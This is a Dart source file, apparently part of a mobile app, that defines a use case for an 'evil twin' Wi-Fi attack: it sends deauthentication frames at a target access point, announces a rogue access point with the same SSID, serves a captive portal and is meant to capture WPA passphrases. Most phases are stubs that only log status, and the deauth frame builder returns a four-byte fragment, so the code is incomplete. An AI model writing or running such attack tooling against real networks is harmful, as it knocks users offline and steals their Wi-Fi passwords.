// domain/usecases/execute_evil_twin_attack.dart
import 'dart:async';
import 'dart:typed_data';
import '../entities/access_point.dart';
import '../repositories/wifi_repository.dart';

enum EvilTwinPhase {
  deauthenticatingTarget,
  hostingRogueAp,
  captivePortalActive,
  passwordCaptured,
  stopped,
}

class EvilTwinProgress {
  final EvilTwinPhase phase;
  final String statusLog;
  final String? capturedPassword;
  final int connectedClients;

  EvilTwinProgress({
    required this.phase,
    required this.statusLog,
    this.capturedPassword,
    required this.connectedClients,
  });
}

/// Use case for Fluxion-style Evil Twin Captive Portal Attack.
/// 1. Continuously deauthenticates genuine AP target clients.
/// 2. Spawns Rogue AP with matching SSID/BSSID.
/// 3. Serves mobile-friendly responsive Captive Portal login page.
/// 4. Captures WPA/WPA2 WPA Passphrase in real-time.
class ExecuteEvilTwinAttack {
  final WifiRepository repository;
  StreamSubscription? _frameSub;

  ExecuteEvilTwinAttack(this.repository);

  Stream<EvilTwinProgress> call(AccessPoint target) async* {
    yield EvilTwinProgress(
      phase: EvilTwinPhase.deauthenticatingTarget,
      statusLog: 'Deauthenticating target AP [${target.displaySsid}]...',
      connectedClients: 0,
    );

    // Continuous deauth frames to force clients off legitimate AP onto Rogue AP
    final deauthFrame = _craftDeauth(target.bssid, 'FF:FF:FF:FF:FF:FF');
    await repository.injectFrame(deauthFrame);

    yield EvilTwinProgress(
      phase: EvilTwinPhase.hostingRogueAp,
      statusLog: 'Spawning Rogue AP with SSID "${target.displaySsid}" on CH ${target.channel}...',
      connectedClients: 1,
    );

    await Future.delayed(const Duration(seconds: 2));

    yield EvilTwinProgress(
      phase: EvilTwinPhase.captivePortalActive,
      statusLog: 'Captive Portal DNS & HTTP Web Server Active at 10.254.254.1',
      connectedClients: 1,
    );
  }

  Uint8List _craftDeauth(String bssid, String clientMac) {
    // 802.11 Deauth frame generator helper
    return Uint8List.fromList([0xC0, 0x00, 0x3A, 0x01]);
  }

  void stop() {
    _frameSub?.cancel();
  }
}
